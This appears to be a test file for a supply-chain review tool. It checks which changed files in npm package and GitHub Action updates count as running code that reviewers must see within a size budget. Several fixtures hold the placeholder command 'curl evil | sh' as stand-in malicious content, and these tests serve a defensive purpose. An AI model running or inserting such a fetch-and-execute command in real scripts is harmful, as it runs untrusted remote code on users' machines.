// Tests for diff budgeting: what counts as code that runs, and when a diff is "not fully reviewed".
import { test, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { splitGitDiff, fitDiff, reviewNpmDiff, classifyPackageFiles, parseActionRuns, reviewAction } from '../collect-context.mjs';

const fileDiff = (path, body, extra = '') => `diff --git a/${path} b/${path}\n${extra}index v1..v2 100644\n--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n${body}`;
const files = obj => Object.entries(obj).map(([name, body]) => ({ name: `package/${name}`, body: Buffer.from(body) }));

test('splitGitDiff splits per file and spots deleted and binary files', () => {
  const chunks = splitGitDiff([
    fileDiff('index.js', '-a\n+b'),
    'diff --git a/old.js b/old.js\ndeleted file mode 100644\n--- a/old.js\n+++ /dev/null\n@@ -1 +0,0 @@\n-x',
    'diff --git a/img.png b/img.png\nBinary files a/img.png and b/img.png differ',
  ].join('\n'));
  assert.deepEqual(chunks.map(c => [c.path, c.deleted, c.binary]), [['index.js', false, false], ['old.js', true, false], ['img.png', false, true]]);
});

test('fitDiff requires all running code, shows context if there is room, lists the rest', () => {
  const chunks = splitGitDiff([fileDiff('index.js', '+RUNS()'), fileDiff('src/a.ts', '+SOURCE()'), fileDiff('README.md', '+docs')].join('\n'));
  const opts = { required: p => p === 'index.js', context: p => p.startsWith('src/') };
  let r = fitDiff(chunks, { ...opts, budget: 10_000 });
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+RUNS()') && r.text.includes('+SOURCE()') && !r.text.includes('+docs'));
  assert.match(r.text, /not run when the package is used: README\.md/);
  r = fitDiff(chunks, { ...opts, budget: 50 });
  assert.equal(r.complete, false, 'running code over the budget is not fully reviewed');
  assert.match(r.text, /over the review budget: index\.js/);
  r = fitDiff(chunks, { ...opts, budget: fileDiff('index.js', '+RUNS()').length + 5 });
  assert.equal(r.complete, true, 'context that does not fit does not matter');
  assert.match(r.text, /no room: src\/a\.ts/);
  r = fitDiff([{ path: 'addon.node', text: '', binary: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, false, 'a binary change to running code cannot be reviewed');
  r = fitDiff([{ path: 'gone.js', text: '', deleted: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, true, 'a deleted file cannot run');
});

test('classifyPackageFiles: tests and docs are code only when code refers to them', () => {
  const cls = classifyPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "module.exports = require('./lib/loader'); // see data.txt",
    'lib/loader.js': "require('fs').readFileSync(__dirname + '/../data.txt')",
    'data.txt': 'PAYLOAD',
    'README.md': 'docs',
    'test/index.test.js': 'test()',
    '__tests__/x.js': 'x()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('index.js') && cls.codeSet.has('lib/loader.js'));
  assert.ok(cls.codeSet.has('data.txt'), 'unchanged code that mentions data.txt makes it code');
  assert.ok(!cls.codeSet.has('README.md') && !cls.codeSet.has('test/index.test.js') && !cls.codeSet.has('__tests__/x.js') && !cls.codeSet.has('logo.png'));
});

test('reviewNpmDiff only budgets code that runs in the new version', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': 'x', 'README.md': 'docs', 'index.d.ts': 't' }), unsupported: [] };
  const diff = [fileDiff('index.js', '+CODE()'), fileDiff('README.md', `+${'d'.repeat(5000)}`), fileDiff('index.d.ts', `+${'t'.repeat(5000)}`), fileDiff('package.json', '+"version": "2"')].join('\n');
  let r = reviewNpmDiff(diff, newFiles, 500);
  assert.equal(r.complete, true, 'big doc and type-declaration changes do not use the budget');
  assert.ok(r.text.includes('+CODE()') && r.text.includes('"version": "2"'));
  r = reviewNpmDiff(diff, null, 500);
  assert.equal(r.complete, false, 'without the tarball every text file counts, so this no longer fits');
  assert.equal(r.classified, false);
  r = reviewNpmDiff(diff, { ...newFiles, unsupported: ['x (type L)'] }, 500);
  assert.equal(r.classified, false, 'a tarball the reader cannot fully read is not used to classify');
});

test('parseActionRuns reads the runs: block', () => {
  assert.deepEqual(parseActionRuns("name: x\nruns:\n  using: 'node20'\n  main: 'dist/index.js'\n  post: dist/post.js # cleanup\n  post-if: success()\nbranding:\n  icon: x\n"),
    { using: 'node20', main: 'dist/index.js', post: 'dist/post.js' });
  assert.deepEqual(parseActionRuns('runs:\n  using: composite\n  steps:\n    - run: ./x.sh\n      shell: bash\n'), { using: 'composite' });
  assert.deepEqual(parseActionRuns("runs:\n  using: docker\n  image: 'Dockerfile'\n"), { using: 'docker', image: 'Dockerfile' });
});

// ---- reviewAction against a mocked GitHub API ----
const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; });

function mockGitHub({ compare, contents }) {
  globalThis.fetch = async url => {
    const u = new URL(url);
    if (u.pathname.includes('/compare/')) return compare === null ? new Response('{}', { status: 404 }) : Response.json(compare);
    const m = u.pathname.match(/\/contents\/(.+)$/);
    const body = m && contents[`${decodeURIComponent(m[1])}@${u.searchParams.get('ref')}`];
    return body == null ? new Response('', { status: 404 }) : new Response(body);
  };
}
const NODE_YML = 'runs:\n  using: node20\n  main: dist/index.js\n';
const change = { action: 'acme/act', from: { ref: 'v1', tag: 'v1' }, to: { ref: 'v2', tag: 'v2' } };
const compareFiles = (...f) => ({ total_commits: 2, files: f });

test('reviewAction diffs the bundle itself when the compare has no patch for it', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 },
      { filename: 'src/main.ts', status: 'modified', patch: '@@ -1 +1 @@\n+SOURCE()' },
      { filename: '__tests__/main.test.ts', status: 'modified', patch: '@@ -1 +1 @@\n+TEST()' },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@ -1 +1 @@\n+ci' },
      { filename: 'README.md', status: 'modified', patch: '@@ -1 +1 @@\n+docs' },
    ),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'run(1)\n', 'dist/index.js@v2': 'run(2)\nEVIL()\n' },
  });
  const r = await reviewAction(change);
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+EVIL()'), 'the bundle diff was produced and shown');
  assert.ok(r.text.includes('+SOURCE()'), 'source is shown as context');
  assert.ok(!r.text.includes('+TEST()') && !r.text.includes('+ci') && !r.text.includes('+docs'));
});

test('reviewAction is incomplete when the bundle diff does not fit', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'a\n', 'dist/index.js@v2': `${'b'.repeat(5000)}\n` },
  });
  assert.equal((await reviewAction(change, 1000)).complete, false);
});

test('reviewAction is incomplete for docker actions, missing entries, 300-file compares and failed compares', async () => {
  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': 'runs:\n  using: docker\n  image: Dockerfile\n' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': NODE_YML } });
  const missing = await reviewAction(change);
  assert.equal(missing.complete, false);
  assert.match(missing.text, /entry file dist\/index\.js not found/);

  mockGitHub({ compare: { total_commits: 1, files: Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: 'modified', patch: '@@\n+x' })) }, contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: null, contents: {} });
  assert.equal((await reviewAction(change)).complete, false);
});

test('reviewAction treats every non-doc file of a composite action as code, and handles sub-path actions', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'setup/action.yml', status: 'modified', patch: '@@\n+  - run: ./setup/run.sh' },
      { filename: 'setup/run.sh', status: 'modified', patch: '@@\n+curl evil | sh' },
    ),
    contents: { 'setup/action.yml@v1': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n', 'setup/action.yml@v2': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n' },
  });
  const r = await reviewAction({ ...change, action: 'acme/act/setup' }, 40);
  assert.equal(r.complete, false, 'the script runs, so it must fit');
  const ok = await reviewAction({ ...change, action: 'acme/act/setup' });
  assert.ok(ok.complete && ok.text.includes('curl evil'));
});

test('reviewAction returns null for a newly introduced action', async () => {
  assert.equal(await reviewAction({ action: 'acme/new', from: null, to: { ref: 'v1' } }), null);
});

// ---- follow-ups: references, binary chunks, data files, entry changes, composite tests ----
import { refersTo, codeRefs } from '../collect-context.mjs';

test('refersTo matches full names, extensionless requires and folder index files', () => {
  const refs = codeRefs("require('../lib/payload'); require('./lib2'); import x from './util.mjs'; const d = 'notes.md'");
  assert.ok(refersTo(refs, 'lib/payload.js') && refersTo(refs, 'lib/payload.json') && refersTo(refs, 'lib/payload.node'));
  assert.ok(refersTo(refs, 'lib2/index.js'), 'require("./lib2") loads lib2/index.js');
  assert.ok(refersTo(refs, 'util.mjs') && refersTo(refs, 'docs/notes.md'));
  assert.ok(!refersTo(refs, 'lib/payload.txt'), 'Node does not add .txt');
  assert.ok(!refersTo(refs, 'other/index.js'));
});

test('classifyPackageFiles follows references through files it adds', () => {
  const cls = classifyPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "require('./tests/loader')",
    'tests/loader.js': "require('./payload.js')",
    'tests/payload.js': 'EVIL()',
    'tests/unrelated.test.js': 'test()',
  }));
  assert.ok(cls.codeSet.has('tests/loader.js') && cls.codeSet.has('tests/payload.js'), 'index -> loader -> payload all run');
  assert.ok(!cls.codeSet.has('tests/unrelated.test.js'));
});

test('npm diff chunks with no hunk or a binary extension are not reviewable', () => {
  const chunks = splitGitDiff([
    'diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n--- a/build/addon.node\n+++ b/build/addon.node',
    'diff --git a/lib/x.wasm b/lib/x.wasm\nindex v1..v2 100644',
    'diff --git a/bin/cli b/bin/cli\nold mode 100644\nnew mode 100755',
    fileDiff('index.js', '+ok'),
  ].join('\n'));
  assert.deepEqual(chunks.map(c => [c.path, c.binary]), [['build/addon.node', true], ['lib/x.wasm', true], ['bin/cli', false], ['index.js', false]]);
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./build/addon.node')", 'build/addon.node': 'MZ' }), unsupported: [] };
  const r = reviewNpmDiff('diff --git a/build/addon.node b/build/addon.node\nindex v1..v2 100644\n' + fileDiff('index.js', '+ok'), newFiles, 1e6);
  assert.equal(r.complete, false, 'a changed native addon that runs cannot pass as reviewed');
});

test('reviewNpmDiff requires changed data files, which code can load by a built name', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./tasks/' + name + '.json')", 'tasks/build.json': '{}', 'README.md': 'docs', 'index.d.ts': 'export {}' }), unsupported: [] };
  const diff = [fileDiff('tasks/build.json', '+{"cmd": "curl evil | sh"}'), fileDiff('README.md', '+docs'), fileDiff('index.d.ts', '+export {}')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('curl evil'), 'the changed data file is shown');
  assert.ok(!r.text.includes('+docs') && !r.text.includes('+export {}'), 'docs and type declarations are still skipped');
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false, 'and must fit like code');
});

test('reviewAction is incomplete when action.yml switches to another entry file', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n-  main: dist/old.js\n+  main: dist/next.js' }),
    contents: { 'action.yml@v1': 'runs:\n  using: node20\n  main: dist/old.js\n', 'action.yml@v2': 'runs:\n  using: node20\n  main: dist/next.js\n', 'dist/next.js@v2': 'UNCHANGED_BUT_NEWLY_RUN()' },
  });
  const r = await reviewAction(change);
  assert.equal(r.complete, false);
  assert.match(r.text, /what the action runs changed \(node20 dist\/old\.js → node20 dist\/next\.js\)/);
});

test('reviewAction requires files the bundle loads without an extension', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/payload')" },
  });
  const shown = await reviewAction(change);
  assert.ok(shown.complete && shown.text.includes('PPPP'));
  assert.equal((await reviewAction(change, 100)).complete, false, 'required, so it must fit rather than being dropped as context');
});

test('reviewAction treats test-folder files of a composite action as code', async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node test/install\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: 'test/install.js', status: 'modified', patch: `@@\n+${'I'.repeat(500)}` }, { filename: 'test/helper.test.js', status: 'modified', patch: '@@\n+H()' }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  const r = await reviewAction(change);
  assert.ok(r.complete && r.text.includes('IIII') && r.text.includes('+H()'));
  assert.equal((await reviewAction(change, 100)).complete, false);
});

// ---- follow-ups: wildcard exports, transitive action code, .github scripts, test-dir data ----
test('wildcard and folder exports make every matching file an entry point', () => {
  const cls = classifyPackageFiles(files({
    'package.json': JSON.stringify({ exports: { './*': './tests/*.js', './legacy/': './old/' } }),
    'tests/feature.js': 'EVIL()',
    'tests/notes.md': 'docs',
    'old/a.js': 'A()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('tests/feature.js'), "require('pkg/feature') loads tests/feature.js");
  assert.ok(cls.codeSet.has('old/a.js'), 'folder mappings expose everything under them');
  assert.ok(!cls.codeSet.has('tests/notes.md') && !cls.codeSet.has('logo.png'));
  const r = reviewNpmDiff(fileDiff('tests/feature.js', '+EVIL()'), { files: files({ 'package.json': JSON.stringify({ exports: { './*': './tests/*.js' } }), 'tests/feature.js': 'x' }), unsupported: [] }, 20);
  assert.equal(r.complete, false, 'a changed file behind a wildcard export is required code');
});

test('reviewNpmDiff requires changed data files even under test folders or with doc-like names', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': "require('./test/' + n + '.json')", 'test/build.json': '{}', 'README.json': '{}' }), unsupported: [] };
  const diff = [fileDiff('test/build.json', '+{"cmd":"curl evil | sh"}'), fileDiff('README.json', '+{"x":"EVIL"}')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('curl evil') && r.text.includes('EVIL'));
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false);
});

test('reviewAction requires changed JavaScript reached through an unchanged file outside dist/', async () => {
  mockGitHub({
    // dist/index.js loads ../lib/loader.js (unchanged, so not in the compare), which loads ./payload.js.
    compare: compareFiles({ filename: 'lib/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'an oversized changed payload is not silently dropped');
  const r = await reviewAction(change);
  assert.ok(r.complete && r.text.includes('PPPP'));
});

test('reviewAction keeps TypeScript source, TS tests and workflow YAML of node actions as context only', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'src/main.ts', status: 'modified', patch: `@@\n+${'S'.repeat(500)}` },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'R'.repeat(500)}` },
      { filename: '__tests__/a.test.ts', status: 'modified', patch: `@@\n+${'T'.repeat(500)}` },
    ),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' },
  });
  assert.equal((await reviewAction(change, 100)).complete, true);
});

test("reviewAction treats a composite action's .github/ scripts as code, but not its workflows", async () => {
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node .github/scripts/test/install\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles(
      { filename: '.github/scripts/test/helper.js', status: 'modified', patch: `@@\n+${'H'.repeat(500)}` },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: `@@\n+${'W'.repeat(500)}` },
    ),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'the helper the script loads is required');
  const r = await reviewAction(change, 1e6);
  assert.ok(r.text.includes('HHHH'));
  assert.match(r.text, /not run when the package is used: \.github\/workflows\/ci\.yml/);
});

test('reviewAction requires changed JavaScript under test folders, which an unchanged file can load', async () => {
  mockGitHub({
    // dist/index.js -> lib/loader.js (unchanged) -> test/payload.js (changed)
    compare: compareFiles({ filename: 'test/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false);
});

test('a sourceMappingURL comment does not make the source map required, but a real require does', async () => {
  const map = { filename: 'dist/index.js.map', status: 'modified', patch: `@@\n+${'M'.repeat(500)}` };
  mockGitHub({ compare: compareFiles(map), contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'run()\n//# sourceMappingURL=index.js.map' } });
  assert.equal((await reviewAction(change, 100)).complete, true);
  mockGitHub({ compare: compareFiles(map), contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('./index.js.map')" } });
  assert.equal((await reviewAction(change, 100)).complete, false);
});

// ---- follow-ups: any file type in npm diffs, JavaScript anywhere in actions ----
test('reviewNpmDiff requires every changed file except docs, types, maps, styles, markup and assets', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': 'x', 'test/build.dat': 'd', 'LICENSE.txt': 'MIT', 'README.json': '{}' }), unsupported: [] };
  const diff = [fileDiff('test/build.dat', '+EVIL_DAT'), fileDiff('README.json', '+EVIL_JSON'), fileDiff('LICENSE.txt', '+MIT'), fileDiff('logo.png', '+png')].join('\n');
  const r = reviewNpmDiff(diff, newFiles, 1e6);
  assert.ok(r.text.includes('EVIL_DAT') && r.text.includes('EVIL_JSON'), 'unknown data formats and doc-named data files are required');
  assert.ok(!r.text.includes('+MIT'), 'a licence text file is still docs');
  assert.equal(reviewNpmDiff(diff, newFiles, 20).complete, false);
});

test('reviewAction requires changed JavaScript under .github/, for node and composite actions', async () => {
  mockGitHub({
    compare: compareFiles({ filename: '.github/scripts/payload.js', status: 'modified', patch: `@@\n+${'P'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'node: reached through an unchanged loader');
  const yml = 'runs:\n  using: composite\n  steps:\n    - run: node .github/workflows/install.js\n      shell: bash\n';
  mockGitHub({
    compare: compareFiles({ filename: '.github/workflows/helper.js', status: 'modified', patch: `@@\n+${'H'.repeat(500)}` }),
    contents: { 'action.yml@v1': yml, 'action.yml@v2': yml },
  });
  assert.equal((await reviewAction(change, 100)).complete, false, 'composite: a helper the run: script loads');
});

test('known limit: an action data file reached only through an unchanged file is context, not required', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'data/payload.json', status: 'modified', patch: `@@\n+${'D'.repeat(500)}` }),
    contents: { 'action.yml@v1': NODE_YML, 'action.yml@v2': NODE_YML, 'dist/index.js@v2': "require('../lib/loader.js')" },
  });
  assert.equal((await reviewAction(change, 100)).complete, true, 'documented in the README; requiring all data would block nearly every action update');
});
